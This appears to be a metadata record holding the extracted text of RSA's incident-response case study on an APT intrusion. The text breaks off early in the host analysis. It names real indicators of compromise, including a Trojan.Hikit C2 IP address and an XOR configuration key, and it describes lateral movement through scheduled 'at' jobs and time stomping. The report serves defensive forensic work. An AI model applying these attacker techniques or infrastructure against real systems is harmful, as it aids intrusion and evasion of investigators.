{
    "id": "a31cf259-f4e8-4ed7-aac9-afe25df3b3d9",
    "created_at": "2022-10-25T16:48:11.851219Z",
    "updated_at": "2025-03-27T02:06:10.997805Z",
    "deleted_at": null,
    "sha1_hash": "f2755e9e4e380e2a8357916862e145965c6e7365",
    "title": "RSA Incident Response: An APT Case Study",
    "authors": "RSA",
    "file_creation_date": "2015-04-08T20:56:18Z",
    "file_modification_date": "2015-04-08T20:56:18Z",
    "file_size": 8575335,
    "plain_text": "RSA \r Incident \r Response \r incident \r response\n\n\n# RSA Incident Response: An APT Case Study\n\n### RSA Security\n\n 8 April 2015\n\n\n-----\n\n#### Table \r of \r Contents \r \n\n##### 1. Executive \r Summary \r ............................................................................................................................................ \r 5\n\n 2. Security \r Analytics \r and \r ECAT \r Deployment \r .................................................................................................. \r 7\n\n 3. Analysis \r Methodology \r ........................................................................................................................................ \r 8\n\n 4. Case \r Study \r Technical \r Details \r ........................................................................................................................... \r 9\n###### 4.1 Initial \r Consultation \r .......................................................................................................................................................... \r 9 4.2 Incident \r Response \r ............................................................................................................................................................ \r 9 4.2.1 ECAT \r Analysis \r – \r System \r XX13 \r ................................................................................................................................................ \r 10 4.2.2 ECAT \r Analysis \r – \r System \r XXDEV3 \r .......................................................................................................................................... \r 12 4.2.3 ECAT \r Analysis \r – \r Trojan.FF-­‐RAT \r ............................................................................................................................................. \r 15 4.2.4 ECAT \r Analysis \r – \r System \r XXXXNAPP02 \r ............................................................................................................................... \r 16 4.2.5 ECAT \r Analysis \r – \r Recycler \r folder \r ............................................................................................................................................ \r 18 4.2.6 ECAT \r Analysis \r – \r System \r XXME \r ............................................................................................................................................... \r 18 4.2.7 ECAT \r Analysis \r – \r System \r XX22 \r ................................................................................................................................................ \r 21 4.2.8 ECAT \r Analysis \r – \r Hunting \r with \r InstantIOCs. \r ..................................................................................................................... \r 22 4.3 SA \r Analysis \r – \r Trojan.Lurker \r ...................................................................................................................................... \r 23 4.4 Parallel \r Detection \r with \r Security \r Analytics \r ........................................................................................................... \r 26\n\n##### 5. Trojan \r Families \r .................................................................................................................................................. \r 29\n###### 5.1 Trojan.Lurker \r ................................................................................................................................................................. \r 29 5.2 Trojan.SurperhardCorp \r .............................................................................................................................................. \r 30 5.3 Trojan.Derusbi \r ............................................................................................................................................................... \r 30 5.4 Trojan.HiKiT \r ................................................................................................................................................................... \r 31 5.5 Trojan.FF-­‐RAT \r ................................................................................................................................................................ \r 32 5.6 Trojan.PlugX \r ................................................................................................................................................................... \r 34 5.7 Trojan.Gh0st \r ................................................................................................................................................................... \r 34 5.8 Trojan.PoisonIvy \r ........................................................................................................................................................... \r 35\n\n##### 6. Conclusion \r ........................................................................................................................................................... \r 37\n\n 7. Appendix \r I \r ............................................................................................................................................................ \r 38\n\nTable \r 1: \r SA \r beacon \r detection \r rules \r ......................................................................................................................................................... \r 26\nTable \r 2: \r Trojan.Lurker \r files \r details \r and \r C2 \r channels \r ................................................................................................................................ \r 29\nTable \r 3: \r Trojan.SuperhardCorp \r file \r details \r and \r C2 \r channels \r ................................................................................................................... \r 30\nTable \r 4: \r Trojan.Derusbi \r -­‐ \r file \r details \r and \r C2 \r channels \r ............................................................................................................................. \r 30\nTable \r 5: \r Trojan.Hikit \r -­‐ \r file \r details \r and \r C2 \r channels \r .................................................................................................................................. \r 31\nTable \r 6: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details \r ......................................................................................................................................................... \r 32\nTable \r 7: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details \r ......................................................................................................................................................... \r 33\nTable \r 8: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details \r ......................................................................................................................................................... \r 33\nTable \r 10: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details \r ....................................................................................................................................................... \r 33\nTable \r 11: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details \r ....................................................................................................................................................... \r 33\nTable \r 12: \r Trojan.PlugX \r -­‐ \r file \r details \r and \r C2 \r channels \r .............................................................................................................................. \r 34\nTable \r 13: \r Digitally \r Signed \r Trojan.Gh0st \r file \r details \r ................................................................................................................................. \r 35\nTable \r 14: \r Unsigned \r Trojan.Gh0st \r file \r details \r ........................................................................................................................................... \r 35\nTable \r 15: \r Trojan.PoisonIvy \r -­‐ \r file \r details \r ................................................................................................................................................... \r 35\n\n\nRSA \r Incident \r Response \r Case \r Study\n\n\n-----\n\nRSA \r Incident \r Response Page \r 3\n\nFigure \r 1: \r  \r RSA \r vs \r traditional \r analysis \r comparison \r ...................................................................................................................................... \r 5\nFigure \r 2: \r Network \r diagram \r with \r capture \r points \r ........................................................................................................................................ \r 7\nFigure \r 3: \r  \r IR \r Competencies \r ........................................................................................................................................................................ \r 8\nFigure \r 4: \r ShimCache \r results \r from \r memory \r analysis \r .................................................................................................................................. \r 9\nFigure \r 5: \r ECAT \r File \r Properties \r Window \r ................................................................................................................................................... \r 10\nFigure \r 6: \r ECAT \r MFT \r Viewer \r -­‐ \r Trojan.Hikit \r ................................................................................................................................................ \r 10\nFigure \r 7: \r Obfuscated \r and \r deobfuscated \r Trojan.Hikit \r config \r file \r ............................................................................................................. \r 11\nFigure \r 8: \r Yara \r signature \r for \r Trojan.Hikit \r .................................................................................................................................................. \r 11\nFigure \r 9: \r Yara \r hit \r on \r Trojan.Hikit \r ............................................................................................................................................................. \r 12\nFigure \r 10: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.Hikit \r .................................................................................................................................... \r 12\nFigure \r 11: \r ECAT \r MFT \r analysis \r -­‐ \r At#.job \r files \r ............................................................................................................................................ \r 12\nFigure \r 12: \r ECAT \r MFT \r time \r analysis \r .......................................................................................................................................................... \r 13\nFigure \r 13: \r ECAT \r MFT \r analysis \r -­‐ \r Trojan.FF-­‐RAT \r ......................................................................................................................................... \r 13\nFigure \r 14: \r Digital \r Signature \r details \r of \r Trojan.FF-­‐RAT \r .............................................................................................................................. \r 13\nFigure \r 15: \r Yara \r signature \r for \r Trojan.FF-­‐RAT \r ............................................................................................................................................ \r 14\nFigure \r 16: \r ECAT \r MFT \r time \r analysis \r on \r At3.job \r file \r .................................................................................................................................. \r 14\nFigure \r 17: \r SA \r analysis \r -­‐ \r Trojan.FF-­‐RAT \r beaconing \r ................................................................................................................................... \r 14\nFigure \r 18: \r ECAT \r analysis \r -­‐ \r Trojan.FF-­‐RAT \r ................................................................................................................................................. \r 15\nFigure \r 19: \r ECAT \r analysis \r -­‐ \r filtering \r infected \r hosts \r ................................................................................................................................... \r 15\nFigure \r 20: \r ECAT \r analysis \r -­‐ \r requesting \r files \r enterprise \r wide \r .................................................................................................................... \r 15\nFigure \r 21: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.FF-­‐RAT \r ............................................................................................................. \r 16\nFigure \r 22: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Time \r stomping \r ............................................................................................................................... \r 16\nFigure \r 23: \r ECAT \r analysis \r -­‐ \r Trojan.Lurker2 \r ................................................................................................................................................ \r 17\nFigure \r 24: \r Yara \r Signature \r -­‐ \r Trojan.Lurker2 \r .............................................................................................................................................. \r 17\nFigure \r 25: \r Yara \r signature \r -­‐ \r Trojan.DerusbiAP32 \r ...................................................................................................................................... \r 18\nFigure \r 26: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder \r ........................................................................................................................ \r 18\nFigure \r 27: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder \r ........................................................................................................................ \r 19\nFigure \r 28: \r ECAT \r analysis \r -­‐ \r Trojan.Gh0st \r .................................................................................................................................................. \r 19\nFigure \r 30: \r ECAT \r analysis \r -­‐ \r Trojan \r in \r cached \r files \r ..................................................................................................................................... \r 19\nFigure \r 31: \r Relevant \r Internet \r History \r results \r ............................................................................................................................................ \r 20\nFigure \r 32: \r Additional \r relevant \r Internet \r History \r results \r ........................................................................................................................... \r 20\nFigure \r 33: \r ECAT \r analysis \r -­‐ \r Systems \r infected \r with \r Trojan.Gh0st \r .............................................................................................................. \r 20\nFigure \r 34: \r Trojan.Gh0st \r -­‐ \r de-­‐obfuscated \r configuration \r file \r ..................................................................................................................... \r 21\nFigure \r 35: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder \r ........................................................................................................................ \r 21\nFigure \r 36: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.PlugX \r ................................................................................................................................... \r 21\nFigure \r 37: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.PoisonIvy \r ............................................................................................................................ \r 22\nFigure \r 38: \r ECAT \r analysis \r -­‐ \r filtering \r systems \r infected \r with \r PoisonIvy \r ...................................................................................................... \r 22\nFigure \r 39: \r ECAT \r analysis \r -­‐ \r filtering \r systems \r infected \r with \r PoisonIvy \r ...................................................................................................... \r 22\nFigure \r 40: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.Lurker \r .............................................................................................................. \r 23\nFigure \r 41: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.Superhardcorp \r ................................................................................................ \r 23\nFigure \r 42: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r ...................................................................................................................................................... \r 24\nFigure \r 43: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r HTTP \r anomalies \r ........................................................................................................................... \r 24\nFigure \r 44: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r channel \r activity \r ....................................................................................................................... \r 24\nFigure \r 45: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r channel \r activity \r ....................................................................................................................... \r 25\nFigure \r 46: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r activity \r .................................................................................................................................... \r 25\nFigure \r 47 \r Suspicious \r TCP \r Beaconing \r ........................................................................................................................................................ \r 27\nFigure \r 48 \r Suspicious \r TCP \r Beaconing \r ........................................................................................................................................................ \r 27\nFigure \r 49 \r IP.Alias \r Resolution \r for \r drometic.suroot.com \r ........................................................................................................................... \r 27\nFigure \r 50 \r FF-­‐RAT \r Encoded \r Beacon \r .......................................................................................................................................................... \r 28\n\n\n-----\n\nRSA \r Incident \r Response Page \r 4\n\nFigure \r 51 \r FF-­‐RAT \r Decoded \r Beacon \r .......................................................................................................................................................... \r 28\nFigure \r 52 \r FF-­‐RAT \r Detection \r Parser \r .......................................................................................................................................................... \r 28\nFigure \r 53: \r Trojan.Lurker \r -­‐ \r DES \r keys \r used \r by \r each \r variant \r ....................................................................................................................... \r 29\nFigure \r 54: \r Trojan.SuperhardCorp \r -­‐ \r binary \r snippet \r .................................................................................................................................. \r 30\nFigure \r 55: \r Trojan.DerusbiAP32 \r -­‐ \r configuration \r file \r ................................................................................................................................. \r 31\nFigure \r 56: \r Trojan.Hikit \r deobfuscated \r configuration \r file \r .......................................................................................................................... \r 32\nFigure \r 57: \r Trojan.Gh0st \r magic \r string \r ....................................................................................................................................................... \r 35\nFigure \r 58: \r Trojan.PoisonIvy \r -­‐ \r Memory \r snippet \r containing \r password \r ..................................................................................................... \r 35\nFigure \r 59: \r PosionIvy \r server \r side \r .............................................................................................................................................................. \r 36\nFigure \r 60: \r Plaintext \r file \r ............................................................................................................................................................................ \r 38\nFigure \r 61: \r aPACK \r file \r structure \r ................................................................................................................................................................ \r 38\nFigure \r 62: \r Trojan.FF-­‐RAT \r configuration \r file \r structure \r ............................................................................................................................. \r 39\nFigure \r 63: \r Trojan.FF-­‐RAT \r RC4 \r key \r example \r ............................................................................................................................................. \r 39\nFigure \r 64: \r Trojan.FF-­‐RAT \r RC4 \r decrypted \r configuration \r file \r ..................................................................................................................... \r 39\nFigure \r 65: \r RC4 \r decrypted \r configuration \r file \r with \r manually \r generated \r aPACK \r header \r ........................................................................... \r 40\nFigure \r 66: \r appack.exe \r error \r message \r ...................................................................................................................................................... \r 40\nFigure \r 67: \r Disassembly \r of \r appack.exe \r ..................................................................................................................................................... \r 41\nFigure \r 68: \r Patching \r appack.exe \r ............................................................................................................................................................... \r 41\nFigure \r 69:RC4 \r decrypted \r and \r aPACK \r decompressed \r Trojan.FF-­‐RAT \r configuration \r file \r ........................................................................... \r 42\n\n\n-----\n\nRSA \r Incident \r Response Page \r 5\n\n#### 1. Executive Summary\n\nThis \r case \r study \r contains \r information \r from \r an \r engagement \r that \r the \r RSA \r Incident \r Response \r (IR) \r team \r worked \r during \r the\nSeptember \r to \r October \r 2013 \r timeframe. \r It \r highlights \r the \r analysis \r flow \r using \r two \r of \r our \r flagship \r products, \r Security\nAnalytics \r (SA) \r and \r the \r Enterprise \r Compromise \r Assessment \r Tool \r (ECAT), \r for \r an \r Advance \r Persistent \r Threat \r (APT) \r intrusion\ninvestigation. \r  \r These \r key \r technologies \r allow \r RSA \r analysts \r to \r process \r massive \r datasets \r and \r find \r forensically \r interesting\nartifacts \r in \r near \r real-­‐time \r and \r more \r quickly \r than \r using \r standard \r incident \r response \r processes.\n\nAPT \r actors \r are \r typically \r state \r sponsored, \r highly \r skilled, \r and \r have \r the \r resources \r to \r maintain \r prolonged \r campaigns \r of\nattacks \r against \r their \r targets. \r  \r Law \r Enforcement \r (LE), \r security \r researchers \r or \r other \r 3rd-­‐party \r entities \r typically \r notify\nvictims \r of \r APT \r intrusions, \r like \r the \r one \r in \r this \r case. \r  \r When \r analysts \r initially \r start \r working \r with \r a \r customer, \r the \r intent \r is \r to\nverify \r the \r intelligence \r of \r the \r notification. \r  \r Too \r narrow \r of \r a \r focus \r on \r specific \r threat \r actors \r and \r known \r Indicators \r of\nCompromise \r (IOC) \r can \r give \r the \r analyst \r a \r myopic \r view \r of \r the \r scope \r of \r the \r incident. \r  \r This \r is \r where \r the \r traditional \r Incident\nResponse \r process \r and \r the \r process \r employed \r by \r RSA \r diverge. \r  \r Utilizing \r SA \r and \r ECAT \r in \r parallel, \r analysts \r are \r able \r to \r mark\nup \r their \r respective \r datasets \r and \r feed \r each \r other \r actionable \r intelligence. \r  \r Given \r the \r forensic \r capabilities \r of \r the \r respective\ntools, \r a \r large \r majority \r of \r the \r Host \r Based \r triage \r analysis \r can \r be \r completed \r before \r ever \r requesting \r full \r disk \r images.\nAdditionally, \r with \r the \r capability \r of \r examining \r the \r host \r in \r detail \r remotely, \r false \r positives \r commonly \r found \r in \r traditional\nIOC \r sweeps \r can \r be \r eliminated, \r reducing \r analytical \r work \r load.\n\nNeither \r technology \r employed \r by \r RSA, \r ECAT[1] \r or \r Security \r Analytics, \r rely \r on \r static \r signatures \r from \r known \r IOCs. \r  \r Instead, \r the\ntechnologies \r utilize \r a \r multi-­‐layer \r approach \r to \r identify \r known \r good \r behavior \r and \r related \r binaries \r while \r the \r unknown \r and\nnon-­‐standard \r artifacts \r stand \r out. \r  \r This \r allows \r the \r analyst \r to \r broaden \r their \r search \r and \r discover \r artifacts \r beyond \r the \r scope\nof \r the \r known. \r  \r This \r workflow \r has \r been \r instrumental \r in \r many \r Incident \r Response \r engagements \r led \r by \r RSA; \r oftentimes\nthere \r are \r multiple \r intrusion \r sets \r and \r older \r campaigns \r left \r behind \r in \r the \r environment, \r not \r discovered \r by \r traditional\nmethods \r including \r Anti-­‐Virus, \r or \r discovered \r during \r previous \r 3[rd] \r party \r response \r efforts. \r  \r Figure \r 1 \r shows \r a \r timeline \r of \r a\ntraditional \r response \r as \r compared \r to \r an \r incident \r response \r effort \r leveraging \r ECAT \r and \r Security \r Analytics.\n\n**Figure \r 1: \r  \r RSA \r vs \r traditional \r analysis \r comparison**\n\n1\nECAT \r can \r be \r integrated \r with \r OPSWAT, \r which \r scans \r files \r with \r multiple \r AV \r engines, \r and \r Yara \r signatures, \r which \r can \r be \r created \r by \r the \r end \r user.\n\n\n**Figure \r 1: \r  \r RSA \r vs \r traditional \r analysis \r comparison**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 6\n\nDuring \r this \r response \r effort \r RSA \r IR \r discovered \r multiple \r APT \r actors \r in \r the \r network, \r where \r at \r least \r one \r APT \r group \r had \r been \r present \r for\nover \r 3 \r years. \r At \r least \r 18% \r of \r the \r systems \r in \r the \r network \r had \r either \r been \r infected \r with \r Trojans \r deployed \r by \r APT \r actors, \r or \r had \r clear\nevidence \r they \r had \r been \r accessed \r for \r the \r purpose \r of \r stealing \r information. \r  \r Eight \r different \r Trojan \r families \r were \r discovered \r during \r the\ninvestigation, \r some \r of \r which \r were \r capable \r of \r capturing \r keystrokes \r and \r providing \r GUI \r access \r to \r the \r infected \r system.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 7\n\n#### 2. Security Analytics and ECAT Deployment\n\nRSA \r utilized \r the \r victim’s \r Security \r Analytics \r infrastructure \r capturing \r all \r enterprise \r ingress/egress \r traffic \r from \r 3 \r US\nlocations, \r as \r depicted \r in \r Figure \r 1 \r below. \r  \r The \r ECAT \r agent \r was \r deployed \r to \r about \r 500 \r Windows \r systems \r on \r the \r network.\n\n**Figure \r 2: \r Network \r diagram \r with \r capture \r points**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 8\n\n#### 3. Analysis Methodology\n\nRSA \r IR \r employs \r a \r methodology \r that \r is \r founded \r on \r industry \r standards. \r  \r The \r holistic \r approach \r includes \r the \r following \r four\ncore \r components:\n\n    - Intelligence \r gathering \r and \r research;\n\n    - Host-­‐based \r forensic \r analysis;\n\n    - Network-­‐based \r forensic \r analysis; \r and,\n\n    - Malware \r analysis.\n\nUsing \r an \r iterative \r approach, \r the \r RSA \r IR \r Team \r employs \r a \r repeatable \r process \r as \r needed \r upon \r the \r discovery \r of \r additional\nactionable \r data. \r  \r Analysis \r is \r executed \r concurrently \r and \r therefore \r activities \r are \r performed \r simultaneously \r for \r maximum\nefficiency \r and \r effectiveness. \r  \r To \r complete \r this \r work, \r RSA \r IR \r uses \r several \r commercial \r and \r open \r source \r forensic \r tools \r to\nrecover \r artifacts \r to \r build \r a \r comprehensive \r understanding \r of \r the \r extent \r of \r compromise. \r  \r In \r addition, \r the \r Team \r will\nleverage \r available \r tools \r and \r technologies \r in \r place \r within \r the \r enterprise \r to \r effectively \r utilize \r the \r IOCs \r to \r identify\ncompromised \r systems \r and \r monitor \r for \r continued \r attacker \r presence. \r  \r Using \r this \r methodology \r and \r associated \r proactive\nand \r reactive \r techniques, \r the \r Team \r is \r able \r to \r enhance \r overall \r situational \r awareness \r and \r ultimately \r provide \r answers \r to\nquestions \r and \r actionable \r information \r allowing \r for \r tactical \r decision \r making \r in \r near \r real-­‐time.\n\n**Figure \r 3: \r  \r IR \r Competencies**\n\nDefinitions:\n\n    - Threat \r Intelligence \r -­‐ \r open \r source \r research \r and \r real-­‐time \r fusion \r of \r known \r threat \r data\n\n    - Host \r Forensics \r -­‐ \r analysis \r of \r file \r systems, \r logs, \r memory, \r and \r other \r volatile \r data \r to \r identify \r IOCs \r and/or \r suspicious\nactivity\n\n    - Network \r Forensics \r -­‐ \r analysis \r of \r network \r traffic \r and \r logs \r to \r identify \r IOCs \r and/or \r suspicious \r activity\n\n    - Malware \r Analysis \r -­‐ \r analysis \r of \r code \r to \r identify \r tactics, \r IOCs \r and/or \r suspicious \r activity.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 9\n\n#### 4. Case Study Technical Details\n\n###### 4.1 Initial Consultation\n\nA \r Law \r Enforcement \r agency \r notified \r the \r victim \r (CompanyA) \r on \r July \r 2013 \r about \r potential \r unauthorized \r activity \r emanating\nfrom \r CompanyA’s \r network. \r  \r This \r LE \r notification \r mentioned \r that \r a \r rather \r large \r amount \r of \r data \r had \r been \r exfiltrated.\nCompanyA \r requested \r the \r help \r of \r the \r RSA \r IR \r team \r to \r determine \r the \r extent \r of \r the \r problem. \r  \r CompanyA \r sent \r firewall \r logs\nfor \r a \r 24-­‐hour \r period \r encompassing \r the \r time \r in \r the \r notification \r from \r the \r LE \r agency. \r  \r The \r RSA \r IR \r team \r was \r able \r to \r rapidly\nanalyze \r the \r firewall \r logs, \r pinpointing \r several \r entries \r from \r a \r machine \r that \r had \r two \r large \r transfers. \r The \r two \r file \r transfer\nsizes \r combined \r matched \r the \r approximate \r amount \r of \r data \r that \r had \r been \r reported \r as \r being \r exfiltrated \r to \r an \r external\nsystem \r in \r the \r continental \r United \r States. \r  \r The \r RSA \r IR \r team \r provided \r this \r information \r back \r to \r CompanyA, \r and \r requested\nthat \r CompanyA \r provide \r a \r memory \r dump \r of \r that \r particular \r server \r for \r analysis.\n\nThe \r RSA \r IR \r team \r used \r Volatility \r to \r analyze \r the \r submitted \r memory \r dump. \r  \r Very \r quickly, \r while \r parsing \r the \r Application\nCompatibility \r cache \r from \r the \r memory \r image, \r RSA \r IR \r confirmed \r this \r server \r likely \r had \r unauthorized \r activity \r based \r on\nlocations \r and \r filenames \r that \r were \r executed \r on \r the \r system. \r  \r Figure \r 4 \r below \r depicts \r a \r portion \r of \r the \r suspected \r tools \r that\nwere \r executed \r on \r the \r system. \r These \r filenames \r and \r location \r have \r been \r previously \r associated \r with \r APT \r actor \r tools,\ntechniques \r and \r procedures \r (TTP’s).\n\n**Figure \r 4: \r ShimCache \r results \r from \r memory \r analysis**\n\nBased \r on \r these \r findings \r RSA \r IR \r advised \r CompanyA \r that \r this \r server \r had \r evidence \r of \r unauthorized \r activity, \r and \r that \r based\non \r some \r of \r the \r filenames \r of \r the \r tools, \r the \r adversary \r had \r most \r likely \r dumped \r password \r hashes. \r  \r RSA \r IR \r advised\nCompanyA \r that \r based \r on \r the \r Last \r Modified \r times \r for \r the \r executed \r files, \r this \r adversary \r had \r been \r on \r this \r system \r since \r at\nleast \r 2012 \r and \r possibly \r 2010. \r These \r findings \r indicated \r a \r high \r probability \r that \r other \r systems \r on \r the \r network \r were\ncompromised \r and/or \r accessed.\n\nThe \r same \r LE \r agency \r notified \r the \r company \r again \r in \r September \r 2013 \r of \r more \r unauthorized \r activity.\n\n###### 4.2 Incident Response\n\nOn \r 26 \r September \r 2013 \r the \r RSA \r IR \r team \r was \r formally \r engaged \r to \r respond \r to \r this \r incident. \r  \r The \r following \r section\ndescribes \r how \r RSA \r IR \r analysts \r were \r able \r to \r utilize \r SA \r and \r ECAT \r to \r investigate \r this \r incident. \r  \r The \r ECAT \r agent \r was\ninitially \r deployed \r to \r a \r small \r number \r of \r systems \r on \r the \r network \r primarily \r due \r to \r the \r victim’s \r belief \r that \r this \r was \r an\nisolated \r incident. \r CompanyA \r had \r taken \r the \r first \r known \r compromised \r system \r offline \r in \r June, \r a \r few \r weeks \r before \r we\nperformed \r memory \r analysis \r on \r it. \r  \r RSA \r IR \r chose \r eight \r systems \r to \r perform \r host \r forensics \r on \r due \r to \r their \r importance \r to\nthe \r victim \r organization.\n\n\n**Figure \r 4: \r ShimCache \r results \r from \r memory \r analysis**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 10\n\n**4.2.1** **ECAT \r Analysis \r – \r System \r XX13[2]**\n\nECAT \r contains \r a \r set \r of \r filters \r and \r IOCs \r that \r highlight \r files \r of \r interest \r based \r purely \r on \r behavioral \r characteristics \r such\nas \r how \r they \r are \r loaded \r or \r where \r they \r are \r located. \r One \r of \r these \r filters \r is \r the \r “Reserved \r Filename”, \r which \r displays \r any\nfiles \r that \r have \r reserved \r names \r and \r are \r not \r in \r their \r default \r location. \r  \r The \r list \r of \r Reserved \r Filenames \r includes \r both\ncommon \r Windows \r file \r system \r names \r such \r as \r svchost.exe, \r explorer.exe, \r etc, \r as \r well \r as \r the \r names \r of \r common\napplications \r such \r as \r browser \r executables. \r  \r In \r the \r example \r depicted \r in \r Figure \r 5 \r below, \r ECAT \r indicated \r that \r a \r file\nnamed \r svchost.exe \r (which \r natively \r resides \r under \r c:\\Windows\\system32\\ \r folder) \r is \r suspicious \r due \r to \r its \r unexpected\nlocation.\n\n**Figure \r 5: \r ECAT \r File \r Properties \r Window**\n\nAnother \r very \r useful \r feature \r of \r ECAT \r is \r the \r ability \r to \r triage \r a \r system \r by \r downloading \r a \r system’s \r Master \r File \r Table\n(MFT) \r directly \r from \r ECAT’s \r console, \r swiftly \r allowing \r the \r ECAT \r analyst \r to \r triage \r a \r system \r remotely \r without \r interfering\nwith \r the \r end \r user’s \r usage \r of \r the \r system. \r  \r The \r built-­‐in \r ECAT \r MFT \r Viewer \r displays \r all \r relevant \r NTFS \r attributes \r including\nall \r 8 \r NTFS \r time \r stamps[3]. \r  \r Frequently, \r modern \r APT \r Trojans \r time \r stomp \r their \r files \r to \r avoid \r suspicion, \r so \r seeing \r all \r 8\ntime \r stamps \r is \r critical \r in \r determining \r when \r something \r malicious \r occurred \r as \r well \r as \r finding \r other \r related \r events.\n\nWithin \r a \r few \r seconds \r after \r requesting \r the \r MFT \r the \r analyst \r was \r able \r to \r perform \r time \r analysis \r on \r the \r system. \r  \r This\nprocess \r started \r with \r events \r that \r occurred \r around \r the \r time \r when \r the \r known \r malicious \r file \r named \r svchost.exe \r was\ncreated. \r  \r This \r analysis \r revealed \r another \r related \r file \r named \r svchost.conf, \r which \r was \r determined \r to \r be \r this \r Trojan’s\nobfuscated \r configuration \r file.\n\n**Figure \r 6: \r ECAT \r MFT \r Viewer \r -­‐ \r Trojan.Hikit**\n\n2\nThroughout \r this \r report \r some \r or \r all \r of \r the \r letters \r in \r the \r names \r of \r the \r systems \r have \r been \r obfuscated \r to \r protect \r the \r identity \r of \r our \r client.\n3\nFour \r time \r stamps \r come \r from \r the \r $STANDARD_INFORMATION \r ($SI) \r attribute, \r whereas \r the \r other \r four \r come \r from \r the \r $FILENAME_INFORMATION \r ($FN)\n\nattribute\n\n\n-----\n\nRSA \r Incident \r Response Page \r 11\n\nThe \r configuration \r file \r (svchost.conf) \r is \r obfuscated \r with \r a \r 4 \r byte \r XOR \r key \r (0xFA274BCD) \r and \r contains \r C2 \r IP \r address\n**206.205.82.9. \r  \r These \r two \r malicious \r files \r are \r components \r of \r what \r RSA \r IR \r refers \r to \r as \r Trojan.Hikit:**\n\n**Figure \r 7: \r Obfuscated \r and \r deobfuscated \r Trojan.Hikit \r config \r file**\n\nFrom \r the \r created \r timestamp \r of \r svchost.conf, \r the \r analyst \r deduced \r that \r svchost.exe \r was \r executed \r via \r a \r scheduled \r job,\nand \r it \r dropped \r svchost.conf. \r  \r Malware \r analysis \r on \r svchost.exe \r confirmed \r this \r behavior. \r  \r Typically, \r when \r two \r or \r more\nfiles \r are \r created \r in \r such \r proximity \r in \r time \r to \r each \r other, \r and \r at \r least \r one \r of \r them \r has \r “00” \r for \r the \r seconds, \r this \r is\nindicative \r of \r this \r file \r being \r executed \r via \r a \r scheduled \r job. \r  \r This \r is \r because \r when \r scheduling \r an \r “at” \r job \r the \r user \r only\nspecifies \r an \r hour \r and \r minute, \r thus \r a \r job \r is \r executed \r as \r soon \r as \r the \r specified \r minute \r arrives, \r and \r the \r seconds \r end \r up\nbeing \r “00”.\n\nIn \r this \r case \r it \r is \r highly \r likely \r that \r file \r svchost.exe \r was \r laterally \r copied \r over \r to \r this \r system, \r followed \r by \r remotely\nscheduling \r an \r “at” \r job \r to \r execute \r that \r file[4]. \r  \r The \r job \r was \r executed \r about \r 1 \r minute \r later, \r and \r it \r resulted \r in \r the\ndropping \r of \r file \r svchost.conf. \r  \r The \r fact \r that \r another \r local \r system \r was \r involved \r to \r infect \r system \r XX13 \r was \r important\nbecause \r it \r showed \r that \r at \r least \r one \r other \r system \r on \r the \r network \r was \r compromised. \r  \r A \r quick \r check \r of \r the\nC:\\Windows\\Tasks \r folder \r did \r not \r show \r any \r leftover \r At.job \r files, \r whereas \r the \r entries \r on \r SchedLgU.txt \r file \r had \r already\nrolled \r into \r 2013. \r  \r Furthermore, \r the \r Windows \r Security \r Event \r logs, \r which \r would \r typically \r contain \r logs \r on \r which\naccount \r and \r from \r which \r system \r the \r lateral \r movement \r occurred, \r had \r also \r rolled. \r  \r Lastly, \r this \r was \r a \r Windows \r XP\nsystem \r and \r so \r their \r event \r log \r Microsoft-­‐Windows-­‐TaskSchedules%4Operational.evtx \r did \r not \r exist, \r which \r is \r typically\nanother \r great \r evidence \r source \r for \r lateral \r movement.\n\nThe \r analyst \r blacklisted \r file \r svchost.exe \r by \r its \r MD5 \r hash \r in \r ECAT \r so \r that \r if \r it \r were \r encountered \r again \r it \r would \r be\nmarked \r as \r malicious. \r  \r However, \r as \r it \r is \r very \r common \r with \r many \r Trojans \r deployed \r on \r a \r network, \r at \r least \r some \r of\nthem \r will \r vary \r slightly \r from \r others \r and \r have \r a \r different \r hash \r value \r since \r at \r a \r minimum \r they \r are \r probably \r configured\nto \r beacon \r to \r different \r C2 \r channels \r or \r compiled \r at \r a \r different \r time. \r  \r This \r is \r where \r another \r great \r feature \r of \r ECAT \r is\nvery \r useful, \r namely \r ECAT’s \r ability \r to \r ingest \r YARA \r signatures. \r  \r This \r feature \r also \r helps \r immediately \r mark \r “suspicious”\nfiles \r as \r “malicious”. \r  \r So, \r it \r is \r common \r practice \r for \r RSA \r IR \r analysts \r to \r create \r Yara \r signatures \r for \r newly \r discovered\nmalicious \r files. \r  \r Figure \r 8 \r provides \r a \r signature \r for \r Trojan.Hikit:\n\n**Figure \r 8: \r Yara \r signature \r for \r Trojan.Hikit**\n\n4\nWhile \r we \r have \r seen \r adversaries \r locally \r schedule \r a \r job \r to \r execute \r a \r file \r on \r the \r local \r system, \r this \r is \r not \r very \r common \r although \r worth \r keeping \r in \r mind.\n\n\n**Figure \r 7: \r Obfuscated \r and \r deobfuscated \r Trojan.Hikit \r config \r file**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 12\n\n**4.2.2** **ECAT \r Analysis \r – \r System \r XXDEV3**\n\nOn \r a \r second \r host \r (XXDEV3) \r of \r the \r eight \r systems \r where \r ECAT \r was \r deployed, \r ECAT \r discovered \r a \r second \r instance \r 